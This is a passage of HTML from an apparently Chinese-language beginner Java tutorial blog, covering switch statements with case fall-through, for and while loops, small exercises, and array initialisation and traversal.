class="hljs-string">&quot;今天是星期三&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">default</span> -&gt; &#123;<br>                System.out.println(<span class="hljs-string">&quot;haha &quot;</span>);<br>            &#125;<br><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="swicth与if的区别"><a href="#swicth与if的区别" class="headerlink" title="swicth与if的区别"></a>swicth与if的区别</h4><ul><li>switch更多的去一一列举有限个数据</li><li>if更多的去进行范围判断</li></ul><h4 id="case穿透例题："><a href="#case穿透例题：" class="headerlink" title="case穿透例题："></a>case穿透例题：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><br>        System.out.println(<span class="hljs-string">&quot;请输入今天是星期几：&quot;</span>);<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">today</span> <span class="hljs-operator">=</span> sc.next();<br><br>        <span class="hljs-keyword">switch</span> (today)&#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;星期一&quot;</span>:<br><br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;星期二&quot;</span>:<br><br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;星期三&quot;</span>:<br><br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;星期四&quot;</span>:<br><br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;星期五&quot;</span>:<br>                System.out.println(<span class="hljs-string">&quot;工作日&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;星期六&quot;</span>:<br><br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;星期日&quot;</span>:<br>                System.out.println(<span class="hljs-string">&quot;休息日&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>当然也可以进一步简化(我的版本有点低就只放图了)：</p><p><img src="/img/JAVAlearn31.png" alt="JAVAlearn31"></p><h4 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h4><ul><li>for</li><li>while</li><li>do…while</li></ul><p>for:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">10</span>; i++)&#123;<br>            System.out.println(<span class="hljs-string">&quot;you should know me&quot;</span>);<br>        &#125;<br><br><br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>练习：求1-100中所有偶数之和</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-comment">//求1到100的偶数和</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">100</span>; i++)&#123;<br><br>            <span class="hljs-keyword">if</span> (i % <span class="hljs-number">2</span> ==<span class="hljs-number">0</span>)&#123;<br><br>                sum = sum +i;<br><br>            &#125;<br>        &#125;<br>        System.out.println(sum);<br><br>        &#125;<br>    &#125;<br><span class="hljs-comment">//2550</span><br></code></pre></td></tr></table></figure><p>练习：键盘录入两个数字，表示一个范围。统计这个范围中既能被三整除又能被五整除的数字有对多少个</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-comment">//求1到100的偶数和</span><br><br>        <span class="hljs-type">int</span> i;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><br>        System.out.println(<span class="hljs-string">&quot;请输入范围较小的数字Num1：&quot;</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">num1</span> <span class="hljs-operator">=</span> sc.nextInt();<br><br>        System.out.println(<span class="hljs-string">&quot;请输入范围较大的数字Num2：&quot;</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">num2</span> <span class="hljs-operator">=</span> sc.nextInt();<br><br>        <span class="hljs-keyword">for</span> (i = num1; i &lt;= num2; i++)&#123;<br>            <span class="hljs-keyword">if</span> (i % <span class="hljs-number">3</span> ==<span class="hljs-number">0</span> &amp;&amp; i % <span class="hljs-number">5</span> ==<span class="hljs-number">0</span>)&#123;<br>                sum = sum +<span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br><br>        System.out.println(<span class="hljs-string">&quot;在&quot;</span> + num1 + <span class="hljs-string">&quot;到&quot;</span> + num2 + <span class="hljs-string">&quot;这个范围中，能同时被3和5整除的数字的数量为：&quot;</span>+sum);<br><br><br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>while:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//打印1到100</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span> (i &lt;= <span class="hljs-number">100</span>) &#123;<br>            System.out.println(i);<br>            i++;<br><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>for和while的对比：</p><p><img src="/img/javalearn24.png" alt="javalearn24"></p><p>比如对于这段代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span> (i &lt;= <span class="hljs-number">10</span>) &#123;<br>            System.out.println(i);<br>            i++;<br><br>        &#125;<br>        System.out.println(i);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>最后输出的数据会是<code>11</code></p><p>当然可以对<code>for</code>进行如下改写(i提到外面)：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">for</span> ( ; i &lt;= <span class="hljs-number">10</span>;i++) &#123;<br>            System.out.println(i);<br>            <br><br>        &#125;<br>        System.out.println(i);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/javalearn25.png" alt="javalearn25"></p><p>练习：如果想把<code>0.1mm</code>的纸折叠成<code>8844430mm</code>，求折叠的次数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//把`0.1mm`的纸折叠成`8844430mm`，求折叠的次数</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-type">double</span> <span class="hljs-variable">hight</span> <span class="hljs-operator">=</span> <span class="hljs-number">0.1</span>;<br><br><br>        <span class="hljs-keyword">while</span> (hight &lt;= <span class="hljs-number">8844430</span>)&#123;<br><br>            hight = hight * <span class="hljs-number">2</span>;<br><br>            i = i +<span class="hljs-number">1</span>;<br>        &#125;<br>        System.out.println(i);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>判断回文数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java">```<br><br><br><br>P48<br><br>P54:<br><br>### 数组<br><br>&gt; 数组指的是一种容器，可以用来存储同种数据类型的多个值<br><br>![javalearn26](img/javalearn26.png)<br><br><br><br>数组的定义<br><br>![javalearn27](img/javalearn27.png)<br><br>数组初始化方式：<br><br>- 静态初始化：<br><br>![javaleearn29](img/javaleearn29.png)<br><br>比如：<br><br>```java<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span> [] theirage = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br>        String [] theirname = &#123;<span class="hljs-string">&quot;tom&quot;</span>, <span class="hljs-string">&quot;jack&quot;</span>, <span class="hljs-string">&quot;bob&quot;</span>, <span class="hljs-string">&quot;chris&quot;</span>&#125;;<br>        <span class="hljs-type">double</span> [] theirhight = &#123;<span class="hljs-number">111.1</span>, <span class="hljs-number">222.2</span>, <span class="hljs-number">333.3</span>, <span class="hljs-number">444.4</span>&#125;;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>如何将数组中的数据取出？如果直接<code>sout</code>数组名，比如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span> [] theirage = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br>    System.out.println(theirage);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>会出现：</p><p><img src="/img/javalearn32.png" alt="javalearn32"></p><p><img src="/img/javalearn33.png" alt="javalearn33"></p><p><img src="/img/javalearn34.png" alt="javalearn34"></p><p>数组元素访问</p><ul><li>格式：数组名[索引]</li></ul><p>索引：</p><ul><li>也叫下标、角标。</li><li>特点：从0开始，逐个+1增长，连续不间断。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">int</span> [] theirage = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">array1</span> <span class="hljs-operator">=</span> theirage[<span class="hljs-number">0</span>];<br><br>        System.out.println(array1);<br><br>        System.out.println(theirage[<span class="hljs-number">0</span>]);<br><br>        theirage[<span class="hljs-number">0</span>] = <span class="hljs-number">100</span>;<br><br>        System.out.println(theirage[<span class="hljs-number">0</span>]);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>数组遍历</p><ul><li>将数组中所有的内容取出来，可以对其进行一系列操作：打印，求和，判断等</li><li>遍历指的是取出数据的过程，不要局限的理解为遍历就是打印</li></ul><p>跟<code>python</code>差不多，还是用<code>for</code>循环进行遍历：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">int</span> [] theirage = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">arraylength</span> <span class="hljs-operator">=</span> theirage.length;<br><br>        System.out.println(arraylength);<br><br>        <span class="hljs-type">int</span> i;<br><br>        <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i &lt; arraylength; i++)&#123;<br><br>            System.out.println(theirage[i]);<br><br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>当然<code>idea</code>也提供了快速生成数组的方式，直接<code>数组名.fori</code>就会自动生成<code>for (i=0; i &lt; arraylength; i++)</code>这东西</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//练习：遍历数组并求和</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">int</span> [] theirage = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">arraylength</span> <span class="hljs-operator">=</span> theirage.length;<br><br>        System.out.println(arraylength);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i1</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i1 &lt; theirage.length; i1++) &#123;<br><br>            System.out.println(theirage[i1]);<br><br>            sum = sum + theirage[i1];<br><br>        &#125;<br><br>        System.out.println(<span class="hljs-string">&quot;数组元素之和为：&quot;</span> + sum);<br><br>    &#125;<br>&#125;<br><span class="hljs-comment">//练习：统计个数</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">int</span> [] theirage = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>&#125;;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">arraylength</span> <span class="hljs-operator">=</span> theirage.length;<br><br>        System.out.println(arraylength);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i1</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i1 &lt; theirage.length; i1++) &#123;<br><br>            System.out.println(theirage[i1]);<br><br>            sum = sum + theirage[i1];<br><br>            <span class="hljs-keyword">if</span> (theirage[i1] % <span class="hljs-number">3</span> ==<span class="hljs-number">0</span>)&#123;<br><br>                System.out.println(<span class="hljs-string">&quot;该数字：&quot;</span> + theirage[i1] + <span class="hljs-string">&quot;可以被3整除&quot;</span>);<br><br>                i = i +<span class="hljs-number">1</span>;<br><br>            &#125;<br><br>        &#125;<br><br>        System.out.println(<span class="hljs-string">&quot;数组元素之和为：&quot;</span> + sum);<br>        <br>        System.out.println(<span class="hljs-string">&quot;该数组中一共有&quot;</span> + i + <span class="hljs-string">&quot;个数可被3整除&quot;</span>);<br><br>    &#125;<br>&#125;<br><span class="hljs-comment">//练习：变化数据</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">int</span> [] theirage = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>&#125;;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">arraylength</span> <span class="hljs-operator">=</span> theirage.length;<br><br>        System.out.println(arraylength);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i1</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i1 &lt; theirage.length; i1++) &#123;<br><br>            System.out.println(theirage[i1]);<br><br>            <span class="hljs-keyword">if</span> (theirage[i1] % <span class="hljs-number">2</span> !=<span class="hljs-number">0</span>)&#123;<br><br>                <span class="hljs-type">int</span> <span class="hljs-variable">doubleit</span> <span class="hljs-operator">=</span> theirage[i1] * <span class="hljs-number">2</span>;<br><br>                theirage[i1] = doubleit;<br><br>                System.out.println(<span class="hljs-string">&quot;该数字是奇数，称2后的结果是：&quot;</span> + doubleit);<br><br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-type">int</span> <span class="hljs-variable">chuer</span> <span class="hljs-operator">=</span> theirage[i1] / <span class="hljs-number">2</span>;<br><br>                theirage[i1] = chuer;<br><br>                System.out.println(<span class="hljs-string">&quot;该数字是偶数，除二后的结果是：&quot;</span> + chuer);<br>            &#125;<br><br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i1</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i1 &lt; theirage.length; i1++) &#123;<br><br>            System.out.println(theirage[i1]);<br><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>数组动态初始化</p><ul><li>初始化时只指定数组长度，由系统为数组分配初始值。</li><li>格式：数据类型[] 数组名 &#x3D; new 数组类型[数组长度];</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>    String[] arr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">50</span>];<br><br>    arr[<span class="hljs-number">0</span>] = <span 